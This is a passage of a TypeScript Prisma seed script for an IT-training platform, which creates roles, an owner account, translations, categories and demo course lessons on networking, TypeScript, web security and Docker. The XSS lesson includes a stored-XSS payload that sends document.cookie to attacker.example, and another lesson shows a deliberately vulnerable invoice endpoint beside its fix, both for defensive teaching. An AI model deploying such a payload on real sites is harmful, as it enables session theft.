/**
 * Database seed.
 *
 * Produces a platform that is immediately usable: an owner account, the role
 * and permission catalogue, every language, the CMS pages that back hardcoded
 * routes, navigation, legal documents, and a small but complete demo course so
 * the learning experience can be exercised end to end.
 *
 * Idempotent by design — every write is an upsert keyed on a stable slug, so
 * running it against an existing database refreshes structure without
 * destroying content.
 */

import { PrismaClient } from '@prisma/client';
import bcrypt from 'bcryptjs';
import {
  FEATURE_DEFINITIONS,
  LOCALES,
  PERMISSIONS,
  PERMISSION_GROUPS,
  SYSTEM_ROLES,
  type Permission,
} from '@academy/types';

const prisma = new PrismaClient();

const ADMIN_EMAIL = process.env.SEED_ADMIN_EMAIL ?? 'admin@academy.local';
const ADMIN_PASSWORD = process.env.SEED_ADMIN_PASSWORD ?? 'Admin123!Change';
const ADMIN_NAME = process.env.SEED_ADMIN_NAME ?? 'Platform Owner';

function text(value: string) {
  return { type: 'paragraph', content: [{ type: 'text', text: value }] };
}

function heading(value: string, level: 2 | 3 = 2) {
  return { type: 'heading', attrs: { level }, content: [{ type: 'text', text: value }] };
}

function bullets(items: string[]) {
  return {
    type: 'bulletList',
    content: items.map((item) => ({ type: 'listItem', content: [text(item)] })),
  };
}

function code(language: string, value: string) {
  return { type: 'codeBlock', attrs: { language }, content: [{ type: 'text', text: value }] };
}

function doc(content: unknown[]) {
  return { type: 'doc', content };
}

/* --------------------------------------------------------------- catalogue */

async function seedPermissions() {
  console.log('  permissions…');
  for (const group of PERMISSION_GROUPS) {
    for (const permission of group.permissions) {
      await prisma.permission.upsert({
        where: { key: permission.key },
        create: { key: permission.key, label: permission.label, groupKey: group.key },
        update: { label: permission.label, groupKey: group.key },
      });
    }
  }
}

/**
 * Role definitions. Each non-super role gets an explicit permission list, so
 * what a Content Manager can and cannot do is legible in one place.
 */
const ROLE_DEFINITIONS: {
  slug: string;
  name: string;
  description: string;
  permissions: Permission[] | 'all';
}[] = [
  {
    slug: SYSTEM_ROLES.SUPER_ADMIN,
    name: 'Super Admin',
    description: 'Unrestricted access. Cannot be deleted or have permissions removed.',
    permissions: 'all',
  },
  {
    slug: SYSTEM_ROLES.ADMIN,
    name: 'Administrator',
    description: 'Runs the platform day to day, without super-admin-only actions.',
    permissions: [
      PERMISSIONS.USERS_READ, PERMISSIONS.USERS_CREATE, PERMISSIONS.USERS_UPDATE,
      PERMISSIONS.ROLES_READ,
      PERMISSIONS.COURSES_READ, PERMISSIONS.COURSES_CREATE, PERMISSIONS.COURSES_UPDATE,
      PERMISSIONS.COURSES_DELETE, PERMISSIONS.COURSES_PUBLISH,
      PERMISSIONS.CATEGORIES_READ, PERMISSIONS.CATEGORIES_MANAGE,
      PERMISSIONS.ENROLLMENTS_READ, PERMISSIONS.ENROLLMENTS_MANAGE,
      PERMISSIONS.PAGES_READ, PERMISSIONS.PAGES_CREATE, PERMISSIONS.PAGES_UPDATE,
      PERMISSIONS.PAGES_DELETE, PERMISSIONS.PAGES_PUBLISH, PERMISSIONS.MENUS_MANAGE,
      PERMISSIONS.BLOG_READ, PERMISSIONS.BLOG_MANAGE,
      PERMISSIONS.COLLECTIONS_READ, PERMISSIONS.COLLECTIONS_MANAGE,
      PERMISSIONS.MEDIA_READ, PERMISSIONS.MEDIA_UPLOAD, PERMISSIONS.MEDIA_DELETE,
      PERMISSIONS.LANGUAGES_MANAGE, PERMISSIONS.TRANSLATIONS_MANAGE, PERMISSIONS.SEO_MANAGE,
      PERMISSIONS.FEATURES_MANAGE, PERMISSIONS.SETTINGS_MANAGE, PERMISSIONS.LEGAL_MANAGE,
      PERMISSIONS.PRODUCTS_READ, PERMISSIONS.PRODUCTS_MANAGE,
      PERMISSIONS.ORDERS_READ, PERMISSIONS.ORDERS_MANAGE,
      PERMISSIONS.ANALYTICS_READ, PERMISSIONS.AUDIT_READ,
    ],
  },
  {
    slug: SYSTEM_ROLES.CONTENT_MANAGER,
    name: 'Content Manager',
    description: 'Writes and publishes courses, pages and articles. No user administration.',
    permissions: [
      PERMISSIONS.COURSES_READ, PERMISSIONS.COURSES_CREATE, PERMISSIONS.COURSES_UPDATE,
      PERMISSIONS.COURSES_PUBLISH,
      PERMISSIONS.CATEGORIES_READ, PERMISSIONS.CATEGORIES_MANAGE,
      PERMISSIONS.PAGES_READ, PERMISSIONS.PAGES_CREATE, PERMISSIONS.PAGES_UPDATE,
      PERMISSIONS.PAGES_PUBLISH, PERMISSIONS.MENUS_MANAGE,
      PERMISSIONS.BLOG_READ, PERMISSIONS.BLOG_MANAGE,
      PERMISSIONS.COLLECTIONS_READ, PERMISSIONS.COLLECTIONS_MANAGE,
      PERMISSIONS.MEDIA_READ, PERMISSIONS.MEDIA_UPLOAD,
      PERMISSIONS.TRANSLATIONS_MANAGE, PERMISSIONS.SEO_MANAGE,
      PERMISSIONS.ANALYTICS_READ,
    ],
  },
  {
    slug: SYSTEM_ROLES.INSTRUCTOR,
    name: 'Instructor',
    description: 'Authors course content and follows learner progress.',
    permissions: [
      PERMISSIONS.COURSES_READ, PERMISSIONS.COURSES_CREATE, PERMISSIONS.COURSES_UPDATE,
      PERMISSIONS.CATEGORIES_READ,
      PERMISSIONS.MEDIA_READ, PERMISSIONS.MEDIA_UPLOAD,
      PERMISSIONS.ENROLLMENTS_READ, PERMISSIONS.ANALYTICS_READ,
    ],
  },
  {
    slug: SYSTEM_ROLES.SUPPORT,
    name: 'Support',
    description: 'Helps learners: read-only on users, can manage enrollments and orders.',
    permissions: [
      PERMISSIONS.USERS_READ,
      PERMISSIONS.COURSES_READ, PERMISSIONS.CATEGORIES_READ,
      PERMISSIONS.ENROLLMENTS_READ, PERMISSIONS.ENROLLMENTS_MANAGE,
      PERMISSIONS.ORDERS_READ, PERMISSIONS.ORDERS_MANAGE,
    ],
  },
  {
    slug: SYSTEM_ROLES.STUDENT,
    // Learners hold no admin permissions at all: an empty set is what keeps
    // them out of /admin entirely.
    name: 'Student',
    description: 'Default role for every new account. No administrative access.',
    permissions: [],
  },
];

async function seedRoles() {
  console.log('  roles…');
  const allPermissions = await prisma.permission.findMany({ select: { id: true, key: true } });
  const permissionIdByKey = new Map(allPermissions.map((entry) => [entry.key, entry.id]));

  for (const definition of ROLE_DEFINITIONS) {
    const role = await prisma.role.upsert({
      where: { slug: definition.slug },
      create: {
        slug: definition.slug,
        name: definition.name,
        description: definition.description,
        isSystem: true,
      },
      update: { name: definition.name, description: definition.description, isSystem: true },
    });

    const keys =
      definition.permissions === 'all'
        ? allPermissions.map((entry) => entry.key)
        : definition.permissions;

    await prisma.rolePermission.deleteMany({ where: { roleId: role.id } });
    if (keys.length > 0) {
      await prisma.rolePermission.createMany({
        data: keys
          .map((key) => permissionIdByKey.get(key))
          .filter((id): id is string => Boolean(id))
          .map((permissionId) => ({ roleId: role.id, permissionId })),
        skipDuplicates: true,
      });
    }
  }
}

async function seedOwner() {
  console.log('  owner account…');
  const superAdmin = await prisma.role.findUniqueOrThrow({
    where: { slug: SYSTEM_ROLES.SUPER_ADMIN },
  });

  const passwordHash = await bcrypt.hash(ADMIN_PASSWORD, 12);

  const user = await prisma.user.upsert({
    where: { email: ADMIN_EMAIL.toLowerCase() },
    create: {
      email: ADMIN_EMAIL.toLowerCase(),
      name: ADMIN_NAME,
      passwordHash,
      emailVerified: true,
      status: 'ACTIVE',
      locale: 'en',
    },
    // An existing owner keeps their password: re-seeding must not reset a
    // credential the operator has already changed.
    update: { status: 'ACTIVE', emailVerified: true },
  });

  await prisma.userRole.upsert({
    where: { userId_roleId: { userId: user.id, roleId: superAdmin.id } },
    create: { userId: user.id, roleId: superAdmin.id },
    update: {},
  });

  return user;
}

async function seedLanguages() {
  console.log('  languages…');
  for (const [index, locale] of LOCALES.entries()) {
    await prisma.language.upsert({
      where: { code: locale.code },
      create: {
        code: locale.code,
        name: locale.name,
        nativeName: locale.nativeName,
        direction: locale.direction,
        flag: locale.flag,
        isActive: ['en', 'hy', 'ru'].includes(locale.code),
        isDefault: locale.code === 'en',
        sortOrder: index,
        fallbackCode: locale.fallback ?? null,
      },
      update: {
        name: locale.name,
        nativeName: locale.nativeName,
        direction: locale.direction,
        flag: locale.flag,
        fallbackCode: locale.fallback ?? null,
      },
    });
  }
}

const UI_STRINGS: Record<string, Record<string, string>> = {
  en: {
    'nav.courses': 'Courses',
    'nav.categories': 'Categories',
    'nav.blog': 'Articles',
    'nav.about': 'About',
    'nav.contact': 'Contact',
    'action.signIn': 'Sign in',
    'action.getStarted': 'Get started',
    'action.enroll': 'Enroll now',
    'action.continue': 'Continue learning',
    'action.search': 'Search',
    'dashboard.title': 'Your dashboard',
    'course.lessons': 'lessons',
    'course.level': 'Level',
    'footer.rights': 'All rights reserved.',
  },
  hy: {
    'nav.courses': 'Դասընթացներ',
    'nav.categories': 'Կատեգորիաներ',
    'nav.blog': 'Հոդվածներ',
    'nav.about': 'Մեր մասին',
    'nav.contact': 'Կապ',
    'action.signIn': 'Մուտք',
    'action.getStarted': 'Սկսել',
    'action.enroll': 'Գրանցվել',
    'action.continue': 'Շարունակել',
    'action.search': 'Որոնել',
    'dashboard.title': 'Իմ վահանակը',
    'course.lessons': 'դաս',
    'course.level': 'Մակարդակ',
    'footer.rights': 'Բոլոր իրավունքները պաշտպանված են։',
  },
  ru: {
    'nav.courses': 'Курсы',
    'nav.categories': 'Категории',
    'nav.blog': 'Статьи',
    'nav.about': 'О нас',
    'nav.contact': 'Контакты',
    'action.signIn': 'Войти',
    'action.getStarted': 'Начать',
    'action.enroll': 'Записаться',
    'action.continue': 'Продолжить',
    'action.search': 'Поиск',
    'dashboard.title': 'Личный кабинет',
    'course.lessons': 'уроков',
    'course.level': 'Уровень',
    'footer.rights': 'Все права защищены.',
  },
};

async function seedTranslations() {
  console.log('  translations…');
  for (const [locale, entries] of Object.entries(UI_STRINGS)) {
    for (const [key, value] of Object.entries(entries)) {
      await prisma.translation.upsert({
        where: { locale_namespace_key: { locale, namespace: 'common', key } },
        create: { locale, namespace: 'common', key, value },
        update: { value },
      });
    }
  }
}

async function seedFeatureFlags() {
  console.log('  feature flags…');
  for (const definition of FEATURE_DEFINITIONS) {
    await prisma.featureFlag.upsert({
      where: { key: definition.key },
      create: {
        key: definition.key,
        label: definition.label,
        description: definition.description,
        isEnabled: definition.defaultEnabled,
      },
      update: { label: definition.label, description: definition.description },
    });
  }
}

async function seedSettings() {
  console.log('  settings…');
  const values: Record<string, unknown> = {
    'site.name': 'ArTech Academy',
    'site.tagline': 'Practical IT skills, taught properly',
    'site.description':
      'Learn networking, development, cloud and security through structured, hands-on courses built by working engineers.',
    'contact.email': 'hello@artech.academy',
    'contact.phone': '+374 10 000000',
    'contact.address': 'Yerevan, Armenia',
    'site.socialLinks': [
      { platform: 'github', url: 'https://github.com' },
      { platform: 'linkedin', url: 'https://linkedin.com' },
      { platform: 'youtube', url: 'https://youtube.com' },
    ],
    'i18n.defaultLocale': 'en',
    'platform.maintenanceMode': false,
    'footer.note': null,
    'seo.defaults': {
      title: 'ArTech Academy — Practical IT courses',
      description:
        'Structured online courses in networking, programming, cloud and cybersecurity, with progress tracking and hands-on lessons.',
      keywords: ['it courses', 'online learning', 'networking', 'programming', 'cloud', 'cybersecurity'],
      twitterCard: 'summary_large_image',
      robots: 'index, follow',
    },
  };

  for (const [key, value] of Object.entries(values)) {
    await prisma.setting.upsert({
      where: { key },
      create: { key, value: value as never },
      update: {},
    });
  }
}

/* --------------------------------------------------------------- taxonomy */

const CATEGORY_TREE = [
  {
    slug: 'programming',
    name: 'Programming',
    description: 'Languages, frameworks and the craft of writing software.',
    iconName: 'Code2',
    colorHex: '#1B2CC1',
    children: [
      { slug: 'frontend-development', name: 'Frontend Development', description: 'React, Next.js, TypeScript and modern browser APIs.', iconName: 'MonitorSmartphone' },
      { slug: 'backend-development', name: 'Backend Development', description: 'Node.js, APIs, databases and server architecture.', iconName: 'Server' },
    ],
  },
  {
    slug: 'networking',
    name: 'Networking',
    description: 'How data actually moves — from cabling to routing protocols.',
    iconName: 'Network',
    colorHex: '#7692FF',
    children: [
      { slug: 'network-fundamentals', name: 'Network Fundamentals', description: 'Models, addressing, switching and routing basics.', iconName: 'Router' },
      { slug: 'network-security', name: 'Network Security', description: 'Firewalls, VPNs, segmentation and monitoring.', iconName: 'ShieldCheck' },
    ],
  },
  {
    slug: 'cloud-devops',
    name: 'Cloud & DevOps',
    description: 'Containers, pipelines and running systems in production.',
    iconName: 'Cloud',
    colorHex: '#091540',
    children: [
      { slug: 'containers', name: 'Containers', description: 'Docker, images, registries and orchestration.', iconName: 'Container' },
      { slug: 'ci-cd', name: 'CI/CD', description: 'Automated build, test and deployment pipelines.', iconName: 'GitBranch' },
    ],
  },
  {
    slug: 'cybersecurity',
    name: 'Cybersecurity',
    description: 'Defensive practice, threat modelling and secure engineering.',
    iconName: 'Lock',
    colorHex: '#ABD2FA',
    children: [
      { slug: 'application-security', name: 'Application Security', description: 'OWASP risks, secure coding and code review.', iconName: 'Bug' },
    ],
  },
];

async function seedCategories() {
  console.log('  categories…');
  for (const [index, parent] of CATEGORY_TREE.entries()) {
    const parentRow = await prisma.category.upsert({
      where: { slug: parent.slug },
      create: {
        slug: parent.slug,
        name: parent.name,
        description: parent.description,
        iconName: parent.iconName,
        colorHex: parent.colorHex,
        sortOrder: index,
      },
      update: { name: parent.name, description: parent.description, iconName: parent.iconName },
    });

    for (const [childIndex, child] of parent.children.entries()) {
      await prisma.category.upsert({
        where: { slug: child.slug },
        create: {
          slug: child.slug,
          name: child.name,
          description: child.description,
          iconName: child.iconName,
          parentId: parentRow.id,
          sortOrder: childIndex,
        },
        update: { name: child.name, description: child.description, parentId: parentRow.id },
      });
    }
  }
}

async function seedInstructors() {
  console.log('  instructors…');
  const instructors = [
    {
      slug: 'anna-petrosyan',
      name: 'Anna Petrosyan',
      headline: 'Network Architect, 12 years in enterprise infrastructure',
      bio: 'Anna designs and troubleshoots large campus and data-centre networks. She teaches the fundamentals the way she wishes they had been taught to her: with packet captures open.',
    },
    {
      slug: 'david-harutyunyan',
      name: 'David Harutyunyan',
      headline: 'Staff Engineer, full-stack TypeScript',
      bio: 'David has shipped production React and Node systems for a decade. His courses focus on the decisions behind the code, not just the syntax.',
    },
    {
      slug: 'mariam-grigoryan',
      name: 'Mariam Grigoryan',
      headline: 'Application Security Engineer',
      bio: 'Mariam reviews code and breaks things for a living. She teaches developers to find their own bugs before anyone else does.',
    },
  ];

  for (const [index, instructor] of instructors.entries()) {
    await prisma.instructor.upsert({
      where: { slug: instructor.slug },
      create: { ...instructor, sortOrder: index, links: [] },
      update: { name: instructor.name, headline: instructor.headline, bio: instructor.bio },
    });
  }
}

/* ----------------------------------------------------------------- courses */

interface SeedLesson {
  slug: string;
  title: string;
  summary: string;
  durationMinutes: number;
  isPreview?: boolean;
  body: unknown;
}

interface SeedModule {
  title: string;
  summary: string;
  lessons: SeedLesson[];
}

interface SeedCourse {
  slug: string;
  title: string;
  summary: string;
  categorySlug: string;
  instructorSlug: string;
  level: 'BEGINNER' | 'INTERMEDIATE' | 'ADVANCED';
  isFeatured: boolean;
  tags: string[];
  outcomes: string[];
  requirements: string[];
  modules: SeedModule[];
}

const COURSES: SeedCourse[] = [
  {
    slug: 'networking-fundamentals-from-zero',
    title: 'Networking Fundamentals from Zero',
    summary:
      'Understand how data really travels across a network — addressing, switching, routing and the tools to prove what is happening.',
    categorySlug: 'network-fundamentals',
    instructorSlug: 'anna-petrosyan',
    level: 'BEGINNER',
    isFeatured: true,
    tags: ['networking', 'tcp/ip', 'routing', 'fundamentals'],
    outcomes: [
      'Explain what happens to a packet from your laptop to a web server',
      'Read and interpret an IPv4 addressing plan, including subnet masks',
      'Describe the difference between a switch, a router and a firewall',
      'Use ping, traceroute and a packet capture to diagnose a broken connection',
    ],
    requirements: [
      'A computer with a terminal — Windows, macOS or Linux',
      'No prior networking knowledge required',
    ],
    modules: [
      {
        title: 'How networks are layered',
        summary: 'The mental model everything else in the course hangs off.',
        lessons: [
          {
            slug: 'why-layers-exist',
            title: 'Why layers exist',
            summary: 'The problem layering solves, and why the model survives despite being an abstraction.',
            durationMinutes: 8,
            isPreview: true,
            body: doc([
              text('Networking is taught in layers for one reason: nobody can hold the whole problem in their head at once. Between the keystroke that sends a message and the electrical signal on a cable, there are decisions about encoding, addressing, routing, reliability and presentation. Layering lets you reason about one of those at a time.'),
              heading('The four layers that matter in practice'),
              text('Textbooks teach seven OSI layers. Working engineers use four, because those are the four you can actually observe with tools:'),
              bullets([
                'Link — how a frame reaches the next device on the same physical network. MAC addresses live here.',
                'Internet — how a packet reaches a device on a different network. IP addresses and routing live here.',
                'Transport — whether delivery is reliable and ordered. TCP and UDP live here, along with port numbers.',
                'Application — what the bytes mean. HTTP, DNS and TLS live here.',
              ]),
              {
                type: 'callout',
                attrs: { variant: 'info' },
                content: [
                  text('A useful test: when something breaks, ask which layer stopped working. "I can ping the server but the website will not load" is a sentence that immediately rules out the bottom two layers.'),
                ],
              },
              heading('Encapsulation', 3),
              text('Each layer wraps the one above it. Your HTTP request becomes the payload of a TCP segment, which becomes the payload of an IP packet, which becomes the payload of an Ethernet frame. Every hop unwraps only as far as it needs to.'),
              code('text', 'Ethernet [ IP [ TCP [ HTTP GET /index.html ] ] ]'),
            ]),
          },
          {
            slug: 'addressing-and-subnets',
            title: 'Addressing and subnets',
            summary: 'IPv4 addresses, masks, and reading a subnet without a calculator.',
            durationMinutes: 14,
            body: doc([
              text('An IPv4 address is 32 bits, written as four decimal numbers. On its own it is meaningless — it only becomes useful alongside a subnet mask, which splits those 32 bits into a network part and a host part.'),
              heading('Reading a mask'),
              text('The notation 192.168.10.20/24 says: the first 24 bits identify the network, the remaining 8 identify the host on it. That gives 256 addresses, two of which are reserved.'),
              {
                type: 'table',
                content: [
                  {
                    type: 'tableRow',
                    content: [
                      { type: 'tableCell', attrs: { header: true }, content: [text('Prefix')] },
                      { type: 'tableCell', attrs: { header: true }, content: [text('Mask')] },
                      { type: 'tableCell', attrs: { header: true }, content: [text('Usable hosts')] },
                    ],
                  },
                  {
                    type: 'tableRow',
                    content: [
                      { type: 'tableCell', content: [text('/24')] },
                      { type: 'tableCell', content: [text('255.255.255.0')] },
                      { type: 'tableCell', content: [text('254')] },
                    ],
                  },
                  {
                    type: 'tableRow',
                    content: [
                      { type: 'tableCell', content: [text('/25')] },
                      { type: 'tableCell', content: [text('255.255.255.128')] },
                      { type: 'tableCell', content: [text('126')] },
                    ],
                  },
                  {
                    type: 'tableRow',
                    content: [
                      { type: 'tableCell', content: [text('/30')] },
                      { type: 'tableCell', content: [text('255.255.255.252')] },
                      { type: 'tableCell', content: [text('2')] },
                    ],
                  },
                ],
              },
              heading('Why two addresses are reserved', 3),
              text('The all-zeros host is the network identifier itself; the all-ones host is the broadcast address. Neither can be assigned to a device, which is why a /24 gives you 254 usable addresses rather than 256.'),
            ]),
          },
          {
            slug: 'switching-vs-routing',
            title: 'Switching versus routing',
            summary: 'What each device actually does with a frame, and where the boundary sits.',
            durationMinutes: 11,
            body: doc([
              text('A switch and a router both forward traffic, but they make their decision using different information, and that difference explains most of network design.'),
              bullets([
                'A switch reads the destination MAC address and forwards the frame out of the port where it last saw that address. It never changes the packet inside.',
                'A router reads the destination IP address, consults its routing table, rewrites the link-layer header and sends the packet onward.',
              ]),
              text('A switch operates within one network. A router is the thing that connects networks together — which is why your default gateway is always a router.'),
            ]),
          },
        ],
      },
      {
        title: 'Proving what is happening',
        summary: 'The diagnostic tools, and how to reason from their output.',
        lessons: [
          {
            slug: 'ping-and-traceroute',
            title: 'ping and traceroute',
            summary: 'Two tools, several failure modes, and what each result rules out.',
            durationMinutes: 12,
            body: doc([
              text('These are the first two commands to reach for, and most engineers use them without quite knowing what they prove.'),
              heading('ping'),
              text('ping sends an ICMP echo request and waits for a reply. A successful ping proves that a route exists in both directions and that the host is up enough to answer ICMP. It proves nothing about whether a service on that host is working.'),
              code('bash', 'ping -c 4 1.1.1.1\n\n64 bytes from 1.1.1.1: icmp_seq=1 ttl=57 time=12.4 ms\n64 bytes from 1.1.1.1: icmp_seq=2 ttl=57 time=11.9 ms'),
              heading('traceroute'),
              text('traceroute exploits the TTL field: it sends packets with TTL 1, then 2, then 3, and each router that discards a packet reports itself. The result is the path, hop by hop.'),
              {
                type: 'callout',
                attrs: { variant: 'warning' },
                content: [
                  text('Stars in a traceroute output do not mean the path is broken. Many routers deliberately deprioritise or drop the ICMP responses traceroute relies on while forwarding real traffic perfectly.'),
                ],
              },
            ]),
          },
          {
            slug: 'reading-a-packet-capture',
            title: 'Reading a packet capture',
            summary: 'Opening a capture and finding the answer without drowning in packets.',
            durationMinutes: 16,
            body: doc([
              text('A packet capture is the ground truth. When two people disagree about whose service is broken, the capture settles it.'),
              heading('Start with a filter, not the packet list'),
              text('An unfiltered capture on a busy interface is unreadable. Decide what you are looking for first:'),
              code('text', 'tcp.port == 443 and ip.addr == 10.0.4.17\nhttp.response.code >= 400\ntcp.flags.reset == 1'),
              heading('The three-way handshake', 3),
              text('Almost every TCP diagnosis starts here. You are looking for SYN, SYN-ACK, ACK. If you see SYN with no response, the traffic is not arriving or is being silently dropped. If you see SYN followed by RST, something actively refused the connection — usually a closed port or a firewall configured to reject rather than drop.'),
            ]),
          },
        ],
      },
    ],
  },
  {
    slug: 'typescript-for-production-applications',
    title: 'TypeScript for Production Applications',
    summary:
      'Move past "JavaScript with types" — model your domain so that whole categories of bug become impossible to express.',
    categorySlug: 'frontend-development',
    instructorSlug: 'david-harutyunyan',
    level: 'INTERMEDIATE',
    isFeatured: true,
    tags: ['typescript', 'javascript', 'types', 'architecture'],
    outcomes: [
      'Model domain state so invalid combinations cannot be constructed',
      'Use discriminated unions instead of optional-field soup',
      'Understand when a type assertion is a legitimate tool and when it is a lie',
      'Configure strict mode without drowning the team in errors',
    ],
    requirements: [
      'Comfortable writing JavaScript, including promises and modules',
      'Some exposure to TypeScript syntax',
    ],
    modules: [
      {
        title: 'Modelling state honestly',
        summary: 'The single highest-leverage habit in a typed codebase.',
        lessons: [
          {
            slug: 'making-illegal-states-unrepresentable',
            title: 'Making illegal states unrepresentable',
            summary: 'Why a bag of optional fields is a bug waiting to happen.',
            durationMinutes: 15,
            isPreview: true,
            body: doc([
              text('Here is a shape that appears in almost every codebase, and it is quietly wrong:'),
              code('typescript', 'interface RequestState {\n  isLoading: boolean;\n  data?: User[];\n  error?: Error;\n}'),
              text('Count the states this type permits: eight. Count the states that make sense: three. The type allows loading and error simultaneously, data and error simultaneously, and — worst of all — none of the three, which every component then has to handle defensively.'),
              heading('The discriminated union'),
              code('typescript', "type RequestState =\n  | { status: 'idle' }\n  | { status: 'loading' }\n  | { status: 'success'; data: User[] }\n  | { status: 'error'; error: Error };"),
              text('Now the compiler enforces what the comment used to promise. Reading data is only possible after narrowing to the success branch, and there is no combination of fields that represents nonsense.'),
              {
                type: 'callout',
                attrs: { variant: 'success' },
                content: [
                  text('The test to apply to any type you write: how many values does it permit that should never occur? Every one of those is a defensive check somebody will forget.'),
                ],
              },
            ]),
          },
          {
            slug: 'narrowing-and-exhaustiveness',
            title: 'Narrowing and exhaustiveness',
            summary: 'Letting the compiler tell you when you have missed a case.',
            durationMinutes: 12,
            body: doc([
              text('A discriminated union pays off when you switch on it. Add an exhaustiveness check and adding a new variant becomes a compile error at every place that needs updating, rather than a runtime surprise.'),
              code('typescript', "function render(state: RequestState) {\n  switch (state.status) {\n    case 'idle': return null;\n    case 'loading': return <Spinner />;\n    case 'success': return <List items={state.data} />;\n    case 'error': return <Error error={state.error} />;\n    default: {\n      // `never` here means every case is handled. Add a variant to the\n      // union and this line stops compiling — which is the point.\n      const exhaustive: never = state;\n      return exhaustive;\n    }\n  }\n}"),
            ]),
          },
        ],
      },
      {
        title: 'Boundaries and trust',
        summary: 'Where types stop being guarantees.',
        lessons: [
          {
            slug: 'validating-at-the-boundary',
            title: 'Validating at the boundary',
            summary: 'Types vanish at runtime, so every external input needs a real check.',
            durationMinutes: 14,
            body: doc([
              text('A TypeScript type is a compile-time claim. It disappears entirely at runtime. That is fine for values your own code constructs and dangerous for anything that arrives from outside.'),
              code('typescript', "// A lie. `response.json()` returns `any`; the annotation asserts a shape\n// nobody has verified.\nconst user = (await response.json()) as User;"),
              text('The fix is to parse rather than assert, at every boundary: HTTP responses, request bodies, environment variables, localStorage, message queues.'),
              code('typescript', "const userSchema = z.object({\n  id: z.string(),\n  email: z.string().email(),\n  roles: z.array(z.string()),\n});\n\nconst user = userSchema.parse(await response.json());\n// `user` is now typed AND verified — the two agree."),
              {
                type: 'callout',
                attrs: { variant: 'danger' },
                content: [
                  text('Every `as` on external data is a place where your types and reality can silently diverge. Treat each one as something to justify in review.'),
                ],
              },
            ]),
          },
        ],
      },
    ],
  },
  {
    slug: 'web-application-security-essentials',
    title: 'Web Application Security Essentials',
    summary:
      'The vulnerability classes that actually reach production, how they are exploited, and the defences that genuinely work.',
    categorySlug: 'application-security',
    instructorSlug: 'mariam-grigoryan',
    level: 'INTERMEDIATE',
    isFeatured: true,
    tags: ['security', 'owasp', 'xss', 'authentication'],
    outcomes: [
      'Recognise injection, broken access control and XSS in real code',
      'Explain why client-side checks are never a security control',
      'Design authentication with correct session and token handling',
      'Review a pull request for the defects that matter most',
    ],
    requirements: [
      'Experience building a web application, front or back end',
      'Basic understanding of HTTP requests and responses',
    ],
    modules: [
      {
        title: 'Access control',
        summary: 'The most common serious flaw, and the least glamorous to fix.',
        lessons: [
          {
            slug: 'broken-access-control',
            title: 'Broken access control',
            summary: 'Why hiding a button is not a permission check.',
            durationMinutes: 13,
            isPreview: true,
            body: doc([
              text('Broken access control tops the OWASP list not because it is subtle but because it is easy to get 95% right and still be exploitable. The bugs are rarely in the login form; they are in the endpoints behind it.'),
              heading('The insecure direct object reference'),
              text('Consider an endpoint that returns an invoice:'),
              code('typescript', "// Vulnerable: the id is trusted completely.\napp.get('/api/invoices/:id', requireAuth, async (req, res) => {\n  const invoice = await db.invoice.findUnique({ where: { id: req.params.id } });\n  res.json(invoice);\n});"),
              text('The endpoint requires a session, so it feels protected. But any authenticated user can request any invoice id. Authentication answers "who are you"; this endpoint never asks "is this yours".'),
              code('typescript', "// Fixed: ownership is part of the query, not an afterthought.\napp.get('/api/invoices/:id', requireAuth, async (req, res) => {\n  const invoice = await db.invoice.findFirst({\n    where: { id: req.params.id, userId: req.user.id },\n  });\n  if (!invoice) return res.status(404).json({ error: 'Not found' });\n  res.json(invoice);\n});"),
              {
                type: 'callout',
                attrs: { variant: 'info' },
                content: [
                  text('Answering 404 rather than 403 for someone else’s record is deliberate: a 403 confirms the record exists, which is itself a small information leak.'),
                ],
              },
            ]),
          },
          {
            slug: 'client-side-checks-are-not-security',
            title: 'Client-side checks are not security',
            summary: 'What the browser can and cannot be trusted to enforce.',
            durationMinutes: 10,
            body: doc([
              text('Everything the browser does is under the user’s control. The JavaScript can be edited, requests can be replayed with different values, and any endpoint the application calls can be called directly.'),
              text('This means hiding an admin link, disabling a form field, or filtering a list in the client are all user-experience decisions, never controls. The same is true of obfuscating or encrypting API requests: whatever the code can decrypt, so can whoever is running it.'),
              heading('What this leaves you'),
              bullets([
                'Authentication and authorisation checked on the server, for every request',
                'Input validated on the server, regardless of what the form already checked',
                'Resource ownership verified against the session, never against a request parameter',
                'Rate limits applied server-side',
              ]),
            ]),
          },
        ],
      },
      {
        title: 'Injection and output',
        summary: 'Where untrusted data meets an interpreter.',
        lessons: [
          {
            slug: 'cross-site-scripting',
            title: 'Cross-site scripting',
            summary: 'How stored XSS happens, and the two defences that hold.',
            durationMinutes: 15,
            body: doc([
              text('XSS is what happens when data written by one user is rendered as code in another user’s browser. The attacker’s script then runs with that victim’s full session.'),
              heading('Stored XSS'),
              text('The dangerous variant. A comment, profile field or CMS block is saved containing markup, and every subsequent visitor executes it.'),
              code('html', '<img src=x onerror="fetch(\'https://attacker.example/?c=\'+document.cookie)">'),
              heading('The defences that work'),
              bullets([
                'Render untrusted data as text, never as markup. Frameworks escape by default; the risk lives in the escape hatches like dangerouslySetInnerHTML.',
                'Where markup genuinely must be allowed, sanitise it on the server with an allowlist — of tags, attributes and URL schemes — and do it on write as well as on render.',
                'Keep session tokens in HttpOnly cookies, so a successful XSS cannot read them.',
                'Set a Content-Security-Policy so injected inline script does not execute even if it lands.',
              ]),
              {
                type: 'callout',
                attrs: { variant: 'warning' },
                content: [
                  text('A denylist of dangerous tags is not a defence. There are too many encodings, too many event handlers, and too many parser quirks. Allowlist what you accept and discard everything else.'),
                ],
              },
            ]),
          },
        ],
      },
    ],
  },
  {
    slug: 'docker-for-developers',
    title: 'Docker for Developers',
    summary:
      'Build images that are small, reproducible and safe to run in production — and understand what a container actually is.',
    categorySlug: 'containers',
    instructorSlug: 'david-harutyunyan',
    level: 'BEGINNER',
    isFeatured: false,
    tags: ['docker', 'containers', 'devops'],
    outcomes: [
      'Explain what a container is in terms of kernel features, not magic',
      'Write a multi-stage Dockerfile that produces a small final image',
      'Use layer caching so rebuilds take seconds rather than minutes',
      'Avoid the defaults that make images insecure',
    ],
    requirements: ['Comfortable on the command line', 'Docker installed locally'],
    modules: [
      {
        title: 'What a container really is',
        summary: 'Demystifying the abstraction before using it.',
        lessons: [
          {
            slug: 'processes-not-machines',
            title: 'Processes, not machines',
            summary: 'Namespaces, cgroups, and why a container starts instantly.',
            durationMinutes: 10,
            isPreview: true,
            body: doc([
              text('A container is not a small virtual machine. It is an ordinary process on the host kernel, started with a restricted view of the system. Two kernel features do almost all the work.'),
              bullets([
                'Namespaces limit what the process can see — its own process tree, network interfaces, mount table and hostname.',
                'Control groups limit what it can consume — CPU shares, memory ceiling, IO bandwidth.',
              ]),
